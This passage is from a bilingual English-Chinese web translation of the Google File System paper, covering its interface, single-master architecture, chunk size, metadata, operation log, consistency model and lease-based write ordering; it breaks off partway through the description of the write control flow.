性能敏感型的应用程序通常会对小规模的读取进行批处理和排序，这样可以顺序地遍历文件，而不是来回遍历。</li><li>工作负载还来自很多对文件的大规模追加写入。一般来说，写入的规模与读取的规模相似。文件一旦被写入就几乎不会被再次修改。系统同样支持小规模的随机写入，但并不一定要高效地执行。</li><li>系统必须能很好的定义并实现多个客户端并发向同一个文件追加数据的语义。我们的文件通常在生产者-消费者队列或多路归并中使用。来自不同机器的数百个生产者可能会并发地向同一个文件中追加写入数据。因此，最小化原子性的同步开销是必不可少的。文件在被生产后可能同时或稍后就会被消费者读取。</li><li>持续的高吞吐比低延迟更重要。我们的大多数应用程序都非常重视以高速率来批量处理数据，而很少有应用程序对单个读取或写入的响应时间有严格的要求。</li></ul><h2 id="2-2、接口"><a href="#2-2、接口" class="headerlink" title="2.2、接口"></a>2.2、接口</h2><p>GFS provides a familiar file system interface, though it does not implement a standard API such as POSIX. Files are organized hierarchically in directories and identified by pathnames. We support the usual operations to create, delete, open, close, read, and write files.</p><p>GFS 提供了一个熟悉的文件系统接口，尽管它没有实现如 POSIX 的标准 API 。 文件在目录中分层组织并由路径名标识。 我们支持创建、删除、打开、关闭、读取和写入文件的常规操作。</p><p>Moreover, GFS has snapshot and record append operations. Snapshot creates a copy of a file or a directory tree at low cost. Record append allows multiple clients to append data to the same file concurrently while guaranteeing the atomicity of each individual client’s append. It is useful for implementing multi-way merge results and producerconsumer queues that many clients can simultaneously append to without additional locking. We have found these types of files to be invaluable in building large distributed applications. Snapshot and record append are discussed further in Sections 3.4 and 3.3 respectively.</p><p>此外，GFS 支持快照（Snapshot）和记录追加（Record Append）操作。 快照能以低成本来创建文件或目录树的副本。 记录追加（Record Append）允许多个客户端同时将数据追加到同一个文件，同时保证每个客户端追加的原子性。 它对于实现多路合并结果和生产者-消费者队列很有用，许多客户端可以同时追加到这些队列而不需要进行加锁。 我们发现这些类型的文件在构建大型分布式应用程序时具有无可估量的价值。 快照和记录追加将分别在 3.4 和 3.3 节中进一步讨论。</p><h2 id="2-3、架构"><a href="#2-3、架构" class="headerlink" title="2.3、架构"></a>2.3、架构</h2><p>A GFS cluster consists of a single master and multiple chunkservers and is accessed by multiple clients, as shown in Figure 1. Each of these is typically a commodity Linux machine running a user-level server process. It is easy to run both a chunkserver and a client on the same machine, as long as machine resources permit and the lower reliability caused by running possibly flaky application code is acceptable.</p><p>GFS 集群由一个主服务器（Master）和多个块服务器（ChunkServer）组成，并被多个客户端访问，如图 1 所示。每个客户端通常都是运行用户级服务器进程的商用 Linux 机器。 在同一台机器上运行块服务器和客户端是很容易的，前提是机器资源允许，并且能够接受运行不稳定的应用程序所导致的低可靠性。</p><div><p><img src="/assets/images/gfs-gfs-architecture.png" alt="图1: GFS架构" loading="lazy"></p></div><p>Files are divided into fixed-size chunks. Each chunkis identified by an immutable and globally unique 64 bit chunk handle assigned by the master at the time of chunkcreation. Chunkservers store chunks on local disks as Linux files and read or write chunkdata specified by a chunkhandle and byte range. For reliability, each chunkis replicated on multiple chunkservers. By default, we store three replicas, though users can designate different replication levels for different regions of the file namespace.</p><p>文件被分成固定大小的块（Chunk）。 每个块在创建时都会由主服务器分配一个不可变且全局唯一的 64 位的句柄。块服务器将块作为 Linux 文件存储在本地磁盘上，并通过块具柄和字节范围来确定要读取和写入的数据范围。为了可靠性，每个块都被复制到多个块服务器上。 默认情况下，我们存储三个副本，用户也可以为文件命名空间的不同区域指定不同的复制级别。</p><p>The master maintains all file system metadata. This includes the namespace, access control information, the mapping from files to chunks, and the current locations of chunks. It also controls system-wide activities such as chunklease management, garbage collection of orphaned chunks, and chunk migration between chunkservers. The master periodically communicates with each chunkserver in HeartBeat messages to give it instructions and collect its state.</p><p>主服务器维护所有文件系统元数据。 这包括命名空间、访问控制信息、从文件到块的映射以及块的当前位置。 它还控制系统范围的活动，例如块的租约管理、孤儿块的垃圾回收以及块服务器之间的块迁移。 主服务器周期性地与每个块服务器进行心跳通信（HeartBeat）来下发指令并采集它的状态。</p><p>GFS client code linked into each application implements the file system API and communicates with the master and chunkservers to read or write data on behalf of the application. Clients interact with the master for metadata operations, but all data-bearing communication goes directly to the chunkservers. We do not provide the POSIX API and therefore need not hook into the Linux vnode layer.</p><p>应用程序通过使用 GFS 的客户端代码来实现文件系统的 API，并借助于它来实现在主服务器和块服务器之间进行读写操作。客户端访问主服务器进行元数据的操作，访问块服务器进行实际数据的操作。我们不提供 POSIX API ，因此不需要连接到 Linux vnode 层。</p><p>Neither the client nor the chunkserver caches file data. Client caches offer little benefit because most applications stream through huge files or have working sets too large to be cached. Not having them simplifies the client and the overall system by eliminating cache coherence issues. (Clients do cache metadata, however.) Chunkservers need not cache file data because chunks are stored as local files and so Linux’s buffer cache already keeps frequently accessed data in memory.</p><p>客户端和块服务器都不缓存文件数据。 客户端缓存几乎没有什么好处，因为大多数应用程序都是流式的传输大量文件或者因为工作集太大以至于没有办法缓存。没有缓存也就不需要解决缓存一致性的问题，从而简化客户端和整个系统。（然而，客户端会缓存一些元数据。）块服务器不需要缓存文件数据，因为块存储是本地文件，Linux 的缓冲区缓存会将经常访问的数据保存到内存中。</p><h2 id="2-4、单主"><a href="#2-4、单主" class="headerlink" title="2.4、单主"></a>2.4、单主</h2><p>Having a single master vastly simplifies our design and enables the master to make sophisticated chunk placement and replication decisions using global knowledge. However, we must minimize its involvement in reads and writes so that it does not become a bottleneck. Clients never read and write file data through the master. Instead, a client asks the master which chunkservers it should contact. It caches this information for a limited time and interacts with the chunkservers directly for many subsequent operations.</p><p>单一的主服务器极大的简化了我们的设计，并使得主服务器能够使用全局的信息实现复杂的块放置以及复制决策。但是，我们必须尽量减少它对读写的参与，以免它成为瓶颈。客户端永远不会通过主服务器读写文件数据。 但是，客户端会通过询问主服务器来了解它应该访问哪些块服务器。并且客户端会在有限的一段时间内缓存这些信息，在后续的很多操作中它将直接与块服务器交互。</p><p>Let us explain the interactions for a simple read with reference to Figure 1. First, using the fixed chunksize, the client translates the file name and byte offset specified by the application into a chunkindex within the file. Then, it sends the master a request containing the file name and chunk index. The master replies with the corresponding chunk handle and locations of the replicas. The client caches this information using the file name and chunkindex as the key.</p><p>让我们参考图 1 介绍一次简单的读操作的交互情况。首先，在使用固定块大小的前提下，客户端将应用程序指定的文件名和字节偏移量转换为文件中的块索引。然后，客户端向主服务器发送一个包含文件名和块索引的请求。主服务器回复给客户端对应的块句柄和副本的位置。客户端使用文件名和块索引作为键来缓存这些信息。</p><p>The client then sends a request to one of the replicas, most likely the closest one. The request specifies the chunk handle and a byte range within that chunk. Further reads of the same chunkrequire no more client-master interaction until the cached information expires or the file is reopened. In fact, the client typically asks for multiple chunks in the same request and the master can also include the information for chunks immediately following those requested. This extra information sidesteps several future client-master interactions at practically no extra cost.</p><p>然后客户端向其中一个副本发送请求，最有可能是最近的副本。 这个请求指定块句柄和该块内的字节范围。在缓存信息过期或文件被重新打开之前，对同一块的下一步读取操作不再需要客户端与主服务器的交互。事实上，客户端通常会在单次请求中请求多个块信息，而主服务器也可以在需要请求的信息后添加之后的块的信息。这些额外的信息无需消耗额外的成本就可以避免未来客户端和主服务器的交互。</p><h2 id="2-5、块大小"><a href="#2-5、块大小" class="headerlink" title="2.5、块大小"></a>2.5、块大小</h2><p>Chunksize is one of the key design parameters. We have chosen 64 MB, which is much larger than typical file system blocksizes. Each chunkreplica is stored as a plain Linux file on a chunkserver and is extended only as needed. Lazy space allocation avoids wasting space due to internal fragmentation, perhaps the greatest objection against such a large chunksize.</p><p>块大小是关键的设计参数之一。 我们选择了 64 MB，这比典型的文件系统块大小大得多。 每个块副本（ChunkReplica）都作为普通的 Linux 文件存储在块服务器上，并且仅在需要时进行扩展。 惰性的空间分配避免了由于内部碎片造成的空间浪费，这可能是对如此大的块大小的最大反对意见。</p><p>A large chunksize offers several important advantages. First, it reduces clients’ need to interact with the master because reads and writes on the same chunkrequire only one initial request to the master for chunklocation information. The reduction is especially significant for our workloads because applications mostly read and write large files sequentially. Even for small random reads, the client can comfortably cache all the chunklocation information for a multi-TB working set. Second, since on a large chunk, a client is more likely to perform many operations on a given chunk, it can reduce network overhead by keeping a persis tent TCP connection to the chunkserver over an extended period of time. Third, it reduces the size of the metadata stored on the master. This allows us to keep the metadata in memory, which in turn brings other advantages that we will discuss in Section 2.6.1.</p><p>一个大的块大小提供了几个重要的优点。首先，因为在同一个块上读取和写入只需要向主服务器发送一个初始请求来获取块位置信息，所以它减少了客户端和主服务器的交互需求。由于很多应用程序大多按顺序读取和写入大文件，因此这种减少对于我们的工作负载来说十分重要。即使对于小的随机读取，客户端也可以轻松缓存数 TB 数据集的所有块位置的信息。其次，客户端更有可能在较大的块大小上执行更多的操作，它可以延长与块服务器的 TCP 连接时间来减少后续的网络连接开销。再次，较大的块大小可以减少主服务器上元数据的大小。这就使得我们能够将元数据保存在内存中，这也带来了其他的一些优点，后续我们将在第 2.6.1 节中进行讨论。</p><p>On the other hand, a large chunksize, even with lazy space allocation, has its disadvantages. A small file consists of a small number of chunks, perhaps just one. The chunkservers storing those chunks may become hot spots if many clients are accessing the same file. In practice, hot spots have not been a major issue because our applications mostly read large multi-chunkfiles sequentially.</p><p>另一方面，较大的块大小即使采用惰性的空间分配也会有一些缺点。一个小文件由少量的块组成，或许只有一个块。如果许多客户端访问同一个文件，存储这些块的块服务器可能会成为热点。实际上，热点并不是主要问题，因为我们的应用程序大多按顺序读取大的拥有多个块的文件。</p><p>However, hot spots did develop when GFS was first used by a batch-queue system: an executable was written to GFS as a single-chunkfile and then started on hundreds of machines at the same time. The few chunkservers storing this executable were overloaded by hundreds of simultaneous requests. We fixed this problem by storing such executables with a higher replication factor and by making the batchqueue system stagger application start times. A potential long-term solution is to allow clients to read data from other clients in such situations.</p><p>然而，当 GFS 首次被批处理队列系统使用时，热点确实出现了：一个可执行文件作为一个单个块文件写入 GFS，然后同时在数百台机器上启动。 存储这个可执行文件的少数块服务器在处理数百个并发请求时出现了超载。我们可以通过设置更高的复制系数（Replication Factor）来存储这种可执行文件，并使批处理队列系统错开应用程序的启动时间来解决这个问题。一个可行的长期的解决方案是允许客户端在这种情况下能够从其他的客户端中读取数据。</p><h2 id="2-6、元数据"><a href="#2-6、元数据" class="headerlink" title="2.6、元数据"></a>2.6、元数据</h2><p>The master stores three major types of metadata: the file and chunk namespaces, the mapping from files to chunks, and the locations of each chunk’s replicas. All metadata is kept in the master’s memory. The first two types (namespaces and file-to-chunk mapping) are also kept persistent by logging mutations to an operation log stored on the master’s local diskand replicated on remote machines. Using a log allows us to update the master state simply, reliably, and without risking inconsistencies in the event of a master crash. The master does not store chunk location information persistently. Instead, it asks each chunkserver about its chunks at master startup and whenever a chunkserver joins the cluster.</p><p>主服务器主要存储三种类型的元数据：文件（File）和块命名空间（Chunk Namespace），文件（File）到块（Chunk）的映射，以及每个块（Chunk）的副本位置。 所有的元数据都保存在主服务器的内存中。前两种类型（文件和块命名空间，文件到块的映射）通过将变动记录到存储到主服务器本地磁盘上，并将其（变动记录）复制到远程机器的操作日志中，来保证数据的持久化。使用日志可以让我们简单、可靠地更新主服务器的状态，并且不会担心主服务器崩溃时数据不一致的问题。主服务器不会持久化存储块的位置信息。相反，它会在主服务器启动和一个块服务器加入集群时，向每个块服务器询问它们的块信息。</p><h3 id="2-6-1、内存数据结构"><a href="#2-6-1、内存数据结构" class="headerlink" title="2.6.1、内存数据结构"></a>2.6.1、内存数据结构</h3><p>Since metadata is stored in memory, master operations are fast. Furthermore, it is easy and efficient for the master to periodically scan through its entire state in the background. This periodic scanning is used to implement chunk garbage collection, re-replication in the presence of chunkserver failures, and chunk migration to balance load and diskspace usage across chunkservers. Sections 4.3 and 4.4 will discuss these activities further.</p><p>由于元数据存储在内存中，主服务器的操作速度十分快。 此外，主服务器在后台定期扫描其整个状态变得既简单又高效。这种定期扫描可用于实现块的垃圾收集，在块服务器故障时进行数据的重新复制，以及进行块迁移来平衡块服务器之间的负载和磁盘空间。4.3 和 4.4 节将进一步讨论这些特性。</p><p>One potential concern for this memory-only approach is that the number of chunks and hence the capacity of the whole system is limited by how much memory the master has. This is not a serious limitation in practice. The master maintains less than 64 bytes of metadata for each 64 MB chunk. Most chunks are full because most files contain many chunks, only the last of which may be partially filled. Similarly, the file namespace data typically requires less then 64 bytes per file because it stores file names compactly using prefix compression.</p><p>这种仅使用内存的方法存在的一个潜在问题是：块的数量以及整个系统的容量受限于主服务器所拥有的内存的容量。实践中发现这并不是一个严重的限制。主服务器需要使用不超过 64 字节的元数据来管理每个 64MB 大小的块。由于大多数文件包含很多块，所以在大多数的块都被完全填充，只有最后一个块可能被部分填充。同样地，由于文件命名空间数据（File Namespace Data）使用前缀压缩的紧凑编码，所以每个文件中这部分的数据通常会小于 64 个字节。</p><p>If necessary to support even larger file systems, the cost of adding extra memory to the master is a small price to pay for the simplicity, reliability, performance, and flexibility we gain by storing the metadata in memory.</p><p>如果有必要支持更大的文件系统，可以通过为主服务器添加额外内存来实现，相比于我们通过将元数据存储在内存中所获得的简单性、可靠性、（高）性能以及灵活性来说，这个成本微乎其微。</p><h3 id="2-6-2、块位置"><a href="#2-6-2、块位置" class="headerlink" title="2.6.2、块位置"></a>2.6.2、块位置</h3><p>The master does not keep a persistent record of which chunkservers have a replica of a given chunk. It simply polls chunkservers for that information at startup. The master can keep itself up-to-date thereafter because it controls all chunk placement and monitors chunkserver status with regular HeartBeat messages.</p><p>主服务器永远不会记录块服务器中含有的块副本信息。它只是会在启动时轮询一下块服务器来获取这个信息。由于主服务器掌控所有块的位置信息并且通过定期的心跳消息来监视块服务器的状态，所以主服务将一直使自己保持在最新的状态。</p><p>We initially attempted to keep chunk location information persistently at the master, but we decided that it was much simpler to request the data from chunkservers at startup, and periodically thereafter. This eliminated the problem of keeping the master and chunkservers in sync as chunkservers join and leave the cluster, change names, fail, restart, and so on. In a cluster with hundreds of servers, these events happen all too often.</p><p>我们最初尝试将块位置信息持久保存在主服务器中，但是后来我们认为在主服务器启动并通过定期的从块服务器中请求数据要简单的很多。这还避免了在块服务器加入和离开集群、更改名称、异常失败、重新启动等各种情况下需要保持主服务器和块服务器同步的问题。在一个拥有数百台服务器的集群中，以上这些事情会经常发生。</p><p>Another way to understand this design decision is to realize that a chunkserver has the final word over what chunks it does or does not have on its own disks. There is no point in trying to maintain a consistent view of this information on the master because errors on a chunkserver may cause chunks to vanish spontaneously (e.g., a disk may go bad and be disabled) or an operator may rename a chunkserver.</p><p>（我们）可以通过另一种思路来理解这个方案设计：块服务器对自己磁盘上的块数据拥有最终的决定权。由于块服务器上的错误可能会导致块信息消失（例如，磁盘可能会坏掉或被禁用），或者操作者可能重命名块服务器，所以试图在主服务器上维护这个消息的一致性视图是没有意义的。</p><h3 id="2-6-3、操作日志"><a href="#2-6-3、操作日志" class="headerlink" title="2.6.3、操作日志"></a>2.6.3、操作日志</h3><p>The operation log contains a historical record of critical metadata changes. It is central to GFS. Not only is it the only persistent record of metadata, but it also serves as a logical time line that defines the order of concurrent operations. Files and chunks, as well as their versions (see Section 4.5), are all uniquely and eternally identified by the logical times at which they were created.</p><p>操作日志包含了关键元数据变更的历史记录。它是 GFS 的核心所在。它不仅是元数据的唯一持久记录，而且还作为逻辑时间线，定义并发操作的顺序。文件、块以及它们的版本（详见 4.5 节）都可以通过它们被创建的逻辑时间唯一且永久地进行标识。</p><p>Since the operation log is critical, we must store it reliably and not make changes visible to clients until metadata changes are made persistent. Otherwise, we effectively lose the whole file system or recent client operations even if the chunks themselves survive. Therefore, we replicate it on multiple remote machines and respond to a client operation only after flushing the corresponding log record to disk both locally and remotely.</p><p>由于操作日志至关重要，我们必须可靠地存储它，并在元数据的变更被持久化之前对客户端不可见。否则，即使数据块保留下来了，我们也有可能会丢失整个文件系统或最近的客户端的操作。因此，我们需要将它复制到多台远程机器上，并在将相应的操作日志持久化到本地和远程的磁盘后才响应客户端操作。</p><p>The master batches several log records together before flushing thereby reducing the impact of flushing and replication on overall system throughput. The master recovers its file system state by replaying the operation log. To minimize startup time, we must keep the log small. The master checkpoints its state whenever the log grows beyond a certain size so that it can recover by loading the latest checkpoint from local disk and replaying only the limited number of log records after that. The checkpoint is in a compact B-tree like form that can be directly mapped into memory and used for namespace lookup without extra parsing. This further speeds up recovery and improves availability.</p><p>主服务器通过将多个日志记录打包成一起进行的刷写，以此来降低刷写和复制对整个系统吞吐量的影响。主服务器通过回放操作日志来恢复其文件系统状态。为了最小化启动时间，我们必须保持日志的小巧。主服务器会在操作日志增长到一定大小时生成检查点，以便在需要恢复时从本地磁盘加载最新检查点，并且只需重放检查点之后的有限数量的操作日志记录即可完成恢复。检查点采用紧凑的类 B 树结构，可以直接映射到内存中，并用于命名空间查找而无需额外解析。这进一步提高了恢复速度并改善了可用性。</p><p>Because building a checkpoint can take a while, the master’s internal state is structured in such a way that a new checkpoint can be created without delaying incoming mutations. The master switches to a new log file and creates the new checkpoint in a separate thread. The new checkpoint includes all mutations before the switch. It can be created in a minute or so for a cluster with a few million files. When completed, it is written to diskboth locally and remotely.</p><p>由于创建检查点可能需要一些时间，因此主服务器的内部状态的结构支持能够在不延迟传入变化的情况下创建新的检查点。主服务器会在一个单独的线程中切换到一个新的日志文件，并创建一个新的检查点。新的检查点包括切换之前的所有变化。对于一个拥有数百万个文件的集群，它可以在一分钟左右创建完成。当完成后，它会在本地和远程写入磁盘持久化。这种结构能够快速创建新的检查点，这使得 GFS 系统的可用性更高。</p><p>Recovery needs only the latest complete checkpoint and subsequent log files. Older checkpoints and log files can be freely deleted, though we keep a few around to guard against catastrophes. A failure during checkpointing does not affect correctness because the recovery code detects and skips incomplete checkpoints.</p><p>恢复过程只需要最新的完整检查点和后续的日志文件。旧的检查点和日志文件可以自由删除，但我们可以保留几个备份以防万一。如果在创建检查点过程中出现故障，也不会影响正确性，因为恢复代码会检测并跳过不完整的检查点。</p><h2 id="2-7、一致性模型"><a href="#2-7、一致性模型" class="headerlink" title="2.7、一致性模型"></a>2.7、一致性模型</h2><p>GFS has a relaxed consistency model that supports our highly distributed applications well but remains relatively simple and efficient to implement. We now discuss GFS’s guarantees and what they mean to applications. We also highlight how GFS maintains these guarantees but leave the details to other parts of the paper.</p><p>GFS 采用松散的一致性模型，能够很好地支持我们高度分布式的应用程序，并且相对简单高效。现在我们讨论一下 GFS 的保证（承诺），以及它们对应用程序的意义。我们还将强调 GFS 如何确保这些保证（承诺），但具体的细节将在本论文的其他部分进行讲解。</p><h3 id="2-7-1、GFS-的保证"><a href="#2-7-1、GFS-的保证" class="headerlink" title="2.7.1、GFS 的保证"></a>2.7.1、GFS 的保证</h3><p>File namespace mutations (e.g., file creation) are atomic. They are handled exclusively by the master: namespace locking guarantees atomicity and correctness (Section 4.1); the master’s operation log defines a global total order of these operations (Section 2.6.3).</p><p>文件命名空间的变动（例如：文件创建）是原子性的。它们由主服务器独立处理：命名空间的锁保证了原子性和正确性（第 4.1 节）；主服务器的操作日志定义了这些操作的全局序列（第 2.6.3 节）。</p><p>The state of a file region after a data mutation depends on the type of mutation, whether it succeeds or fails, and whether there are concurrent mutations. Table 1 summarizes the result. A file region is consistent if all clients will always see the same data, regardless of which replicas they read from. A region is defined after a file data mutation if it is consistent and clients will see what the mutation writes in its entirety. When a mutation succeeds without interference from concurrent writers, the affected region is defined (and by implication consistent): all clients will always see what the mutation has written. Concurrent successful mutations leave the region undefined but consistent: all clients see the same data, but it may not reflect what any one mutation has written. Typically, it consists of mingled fragments from multiple mutations. A failed mutation makes the region inconsistent (hence also undefined): different clients may see different data at different times. We describe below how our applications can distinguish defined regions from undefined regions. The applications do not need to further distinguish between different kinds of undefined regions.</p><p>数据变更后的文件区域状态取决于变更类型、成功或失败以及是否存在并发变更。表1 总结了结果。如果所有客户端无论从哪个副本读取数据都将看到相同的数据，那么文件区域就是一致的。如果在文件数据变更后，区域定义了，那么它是一致的，并且客户端将看到变更所写的全部内容。当一个变更成功且没有受到并发写入的干扰时，受影响的区域被定义为一致的（暗示着区域一直是定义的）：所有客户端将始终看到变更所写的内容。并发成功的变更将区域定义为未定义但一致的，但可能不反映任何一个变更所写的内容。通常，它由多个变更的混合片段组成。失败的变更会使区域不一致（因此也未定义）：不同的客户端在不同的时间可能会看到不同的数据。我们将在下面介绍如何区分应用程序中的定义区域和未定义区域。应用程序不需要进一步区分不同类型的未定义区域。</p><div><p><img src="/assets/images/gfs-file-region-state-after-mutation.png" alt="表 1：变更后的文件区域状态" loading="lazy"></p></div><p>Data mutations may be writes or record appends. A write causes data to be written at an application-specified file offset. A record append causes data (the “record”) to be appended atomically at least once even in the presence of concurrent mutations, but at an offset of GFS’s choosing (Section 3.3). (In contrast, a “regular” append is merely a write at an offset that the client believes to be the current end of file.) The offset is returned to the client and marks the beginning of a defined region that contains the record. In addition, GFS may insert padding or record duplicates in between. They occupy regions considered to be inconsistent and are typically dwarfed by the amount of user data.</p><p>数据变更可能是写操作或记录追加操作。写操作会导致数据被写入应用程序指定的文件偏移量处。记录追加操作会导致数据（即 “记录” ）至少被追加一次，即使在并发变更的情况下，追加的位置也是由 GFS 选择的（请参阅第 3.3 节）。 （相比之下，“常规” 追加仅是在客户端认为是当前文件末尾的偏移处进行写入。）偏移量会被返回给客户端，并标记包含记录的已定义区域的开头。此外， GFS 可能会在这些区域之间插入填充或记录副本。它们占据被视为不一致的区域，但通常远远小于用户的数据量。</p><p>After a sequence of successful mutations, the mutated file region is guaranteed to be defined and contain the data written by the last mutation. GFS achieves this by (a) applying mutations to a chunkin the same order on all its replicas (Section 3.1), and (b) using chunkversion numbers to detect any replica that has become stale because it has missed mutations while its chunkserver was down (Section 4.5). Stale replicas will never be involved in a mutation or given to clients asking the master for chunk locations. They are garbage collected at the earliest opportunity.</p><p>在一系列成功的变更之后，经过变更的文件区域保证是已定义的，并包含由最后一次变更写入的数据。 GFS 通过以下方式实现这一点：（a）按照相同顺序将变更应用于所有副本中的块（第 3.1 节）；（b）使用块版本号检测任何副本上的数据是否因为其块服务器停机，错过了数据变更而较老（第 4.5 节）。陈旧的副本将永远不会参与变更，也不会被提供给向主服务器请求块位置的客户端。它们会尽快地被垃圾回收。</p><p>Since clients cache chunklocations, they may read from a stale replica before that information is refreshed. This window is limited by the cache entry’s timeout and the next open of the file, which purges from the cache all chunkinformation for that file. Moreover, as most of our files are append-only, a stale replica usually returns a premature end of chunkrather than outdated data. When a reader retries and contacts the master, it will immediately get current chunklocations.</p><p>由于客户端会缓存块位置信息，因此它们可能在信息被更新前从一个陈旧的副本处读取数据。这个窗口受限于缓存条目的超时时间和文件的下一次打开时间（此时缓存中该文件的所有块信息将被清除）限制。此外，由于我们的大多数文件都是只进行追加操作，因此陈旧的副本通常会返回块的提前结束信息，而不是过时的数据。当读者重试并联系主服务器时，它将立即获得当前的块位置信息。</p><p>Long after a successful mutation, component failures can of course still corrupt or destroy data. GFS identifies failed chunkservers by regular handshakes between master and all chunkservers and detects data corruption by checksumming (Section 5.2). Once a problem surfaces, the data is restored from valid replicas as soon as possible (Section 4.3). A chunk is lost irreversibly only if all its replicas are lost before GFS can react, typically within minutes. Even in this case, it becomes unavailable, not corrupted: applications receive clear errors rather than corrupt data.</p><p>在成功变更很久之后，组件故障仍然可能会破坏或销毁数据。GFS 通过主服务器和所有块服务器之间的定期握手来识别失败的块服务器，并通过校验和来检测数据损坏（第 5.2 节）。一旦出现问题，数据将尽快从有效副本中恢复（第 4.3 节）。只有当所有副本在 GFS 能够及时处理之前（通常在几分钟内）全部丢失了数据时，块才会被永久丢失。即使在这种情况下，它也是会变得不可用，而不是损坏：应用程序会收到明确的错误消息，而不是损坏的数据。</p><h3 id="2-7-2、对应用的影响"><a href="#2-7-2、对应用的影响" class="headerlink" title="2.7.2、对应用的影响"></a>2.7.2、对应用的影响</h3><p>GFS applications can accommodate the relaxed consistency model with a few simple techniques already needed for other purposes: relying on appends rather than overwrites, checkpointing, and writing self-validating, self-identifying records.</p><p>GFS 应用程序可以通过一些简单的技术来适应松散一致性模型，这些技术已经用于其他目的：依赖于追加而不是覆盖写、进行检查点操作，并编写自我验证、自我识别的记录。</p><p>Practically all our applications mutate files by appending rather than overwriting. In one typical use, a writer generates a file from beginning to end. It atomically renames the file to a permanent name after writing all the data, or periodically checkpoints how much has been successfully written. Checkpoints may also include application-level checksums. Readers verify and process only the file region up to the last checkpoint, which is known to be in the defined state. Regardless of consistency and concurrency issues, this approach has served us well. Appending is far more efficient and more resilient to application failures than random writes. Checkpointing allows writers to restart incrementally and keeps readers from processing successfully written file data that is still incomplete from the application’s perspective.</p><p>几乎所有的 GFS 应用程序都使用追加而不是覆盖的方式进行文件的修改。在一个典型的应用中，写操作将文件从开头一直写到结尾。在所有数据写入后，它会将文件原子重命名为永久名称，或者定期检查已经成功写入了多少数据。检查点还可以包括应用程序级别的校验和。读者只验证和处理文件区域，直到最后一个检查点，这被认为处于已定义的状态。不管一致性和并发问题如何，这种方法都为我们服务得很好。追加写比随机写更有效率，而且更能够抵御应用程序的故障。检查点允许编写者进行增量重启，并防止读者处理应用程序仍未完成的已成功写入的文件数据。</p><p>In the other typical use, many writers concurrently append to a file for merged results or as a producer-consumer queue. Record append’s append-at-least-once semantics preserves each writer’s output. Readers deal with the occasional padding and duplicates as follows. Each record prepared by the writer contains extra information like checksums so that its validity can be verified. A reader can identify and discard extra padding and record fragments using the checksums. If it cannot tolerate the occasional duplicates (e.g., if they would trigger non-idempotent operations), it can filter them out using unique identifiers in the records, which are often needed anyway to name corresponding application entities such as web documents. These functionalities for record I&#x2F;O (except duplicate removal) are in library code shared by our applications and applicable to other file interface implementations at Google. With that, the same sequence of records, plus rare duplicates, is always delivered to the record reader.</p><p>在另一种典型的用法中，许多写入者并发地将数据追加到一个文件中，以进行合并结果或作为生产者-消费者队列。至少追加一次的记录追加语义保留了每个写入者的输出。读取器根据以下方式处理偶尔出现的填充和重复项。每个写入者准备的记录都包含额外的信息，例如校验和，以便可以验证其有效性。读取器可以使用校验和标识并丢弃额外的填充和记录片段。如果读取器无法容忍偶尔的重复项（例如，如果它们会触发非幂等操作），则可以使用记录中的唯一标识符将其过滤掉，这通常也需要为应用程序实体（如 Web 文档）命名。这些用于记录 I&#x2F;O 的功能（除了重复项删除）在我们的应用程序中共享的库代码中，并适用于 Google 中的其他文件接口实现。因此，相同的记录序列加上极少出现的重复项总是会被传递给记录读取器。</p><h1 id="3、系统交互"><a href="#3、系统交互" class="headerlink" title="3、系统交互"></a>3、系统交互</h1><p>We designed the system to minimize the master’s involvement in all operations. With that background, we now describe how the client, master, and chunkservers interact to implement data mutations, atomic record append, and snapshot.</p><p>我们的系统设计旨在最小化主服务器在所有操作中的参与程度。在这个背景下，我们现在描述客户端、主服务器和块服务器如何相互交互，以实现数据变更、原子记录追加和快照。</p><h2 id="3-1、租约和变更顺序"><a href="#3-1、租约和变更顺序" class="headerlink" title="3.1、租约和变更顺序"></a>3.1、租约和变更顺序</h2><p>A mutation is an operation that changes the contents or metadata of a chunksuch as a write or an append operation. Each mutation is performed at all the chunk’s replicas. We use leases to maintain a consistent mutation order across replicas. The master grants a chunk lease to one of the replicas, which we call the primary. The primary picks a serial order for all mutations to the chunk. All replicas follow this order when applying mutations. Thus, the global mutation order is defined first by the lease grant order chosen by the master, and within a lease by the serial numbers assigned by the primary.</p><p>突变（变更）是一种更改块的内容或元数据的操作，例如写入或追加操作。 每个变更都在块的所有副本上执行。 我们使用租约来维护副本之间一致的变更顺序。 主服务器给其中一个副本授予某个数据块的租约，我们把这个副本称为 “主副本”。主副本为数据块中的所有变更选择了一个序列顺序，所有副本都按照这个顺序应用变更。因此，全局变更顺序首先由主服务器选择的租约授予顺序定义，然后在租约内部由主副本分配的序列号定义。</p><p>The lease mechanism is designed to minimize management overhead at the master. A lease has an initial timeout of 60 seconds. However, as long as the chunkis being mutated, the primary can request and typically receive extensions from the master indefinitely. These extension requests and grants are piggybacked on the HeartBeat messages regularly exchanged between the master and all chunkservers. The master may sometimes try to revoke a lease before it expires (e.g., when the master wants to disable mutations on a file that is being renamed). Even if the master loses communication with a primary, it can safely grant a new lease to another replica after the old lease expires.</p><p>租约机制旨在最大程度地减少主服务器的管理开销。租约的初始超时时间为 60 秒。然而，只要数据块正在变更，主副本就可以无限期地向主服务器发送请求来续约。这些续约请求和授予都会被存储在主服务器和所有块服务器之间定期交换的心跳消息中。有时，主服务器可能会在租约到期之前尝试撤销租约（例如，当主服务器想要禁用正在重命名的文件上的变更时）。即使主服务器失去了与主副本的通信，它仍然可以在旧租约过期后安全地向另一个副本授予新的租约。</p><p>In Figure 2, we illustrate this process by following the control flow of a write through these numbered steps.</p><p>在图 2 中，我们通过按照这些编号步骤来跟踪写入控制流程来说明这个过程。</p><div><p><img src="/assets/images/gfs-write-control-and-data-flow.png" alt="图 2：写控制和数据流" loading="lazy"></p></div><ol><li>The client asks the master which chunkserver holds the current lease for the chunkand the locations of the other replicas. If no one has a lease, the master grants one to a replica it chooses (not shown).</li><li>The master replies with the identity of the primary and the locations of the other (secondary) replicas. The client caches this data for future mutations. It needs to contact the master again only when the primary becomes unreachable or replies that it no longer holds a lease.</li><li>The client pushes the data to all the replicas. A client can do so in any order. Each chunkserver will store the data in an internal LRU buffer cache until the data is used or aged out. By decoupling the data flow from the control flow, we can improve performance by scheduling the expensive data flow based on the networktopology regardless of which chunkserver is the primary. Section 3.2 discusses this further.</li><li>Once all the replicas have acknowledged receiving the data, the client sends a write request to the primary. The request identifies the data pushed earlier to all of the replicas. The primary assigns consecutive serial numbers to all the mutations it receives, possibly from multiple clients, which provides the necessary serialization. It applies the mutation to its own local state in serial number order.</li><li>The primary forwards the write request to all secondary replicas. Each secondary replica applies mutations in the same serial number order assigned by the primary.</li><li>The secondaries all reply to the primary 